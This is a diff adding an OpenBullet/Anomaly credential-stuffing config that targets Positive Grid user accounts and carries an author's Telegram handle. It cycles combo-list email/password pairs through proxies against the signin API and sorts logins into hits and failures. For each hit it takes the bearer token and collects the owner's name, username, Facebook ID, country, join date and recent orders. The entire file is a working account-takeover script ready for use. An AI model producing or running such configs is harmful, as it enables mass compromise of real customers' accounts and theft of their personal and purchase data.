@@ -1,0 +1,131 @@
+[SETTINGS]
+{
+  "Name": "positivegrid",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-05T13:44:36.2288841+02:00",
+  "AdditionalInfo": "https://t.me/Koko_Nader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://user-api.positivegrid.com/signin?auth_type=bc&redirect_host=https://www.positivegrid.com&redirect_to=/redirect_to_user_center" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-type: application/json;charset=UTF-8" 
+  HEADER "origin: https://member.positivegrid.com" 
+  HEADER "referer: https://member.positivegrid.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "{\"status\":1,\"data\":{\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+    KEY "key\":\"password_incorrect\"}}" 
+    KEY "error\":{\"message\":\"Password incorrect" 
+
+#token PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+REQUEST GET "https://user-api.positivegrid.com/user/me" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "origin: https://member.positivegrid.com" 
+  HEADER "referer: https://member.positivegrid.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
+
+#full_name PARSE "<SOURCE>" JSON "full_name" CreateEmpty=FALSE -> CAP "full_name" 
+
+#username PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "username" 
+
+#facebook_id PARSE "<SOURCE>" LR "facebook_id\":" "," CreateEmpty=FALSE -> CAP "facebook_id" 
+
+#country PARSE "<SOURCE>" LR "country\":" "}," CreateEmpty=FALSE -> CAP "country" 
+
+#date_joined PARSE "<SOURCE>" JSON "date_joined" CreateEmpty=FALSE -> CAP "date_joined" 
+
+#is_email_verified PARSE "<SOURCE>" JSON "is_email_verified" CreateEmpty=FALSE -> CAP "is_email_verified" 
+
+REQUEST GET "https://user-api.positivegrid.com/user/me/order?page=1&limit=4&sort=date_created:desc&detail=1" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "origin: https://member.positivegrid.com" 
+  HEADER "referer: https://member.positivegrid.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36" 
+
+#data PARSE "<SOURCE>" LR "\"data\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Orders" 
+
+FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader" -> CAP "CHecked by" 
+
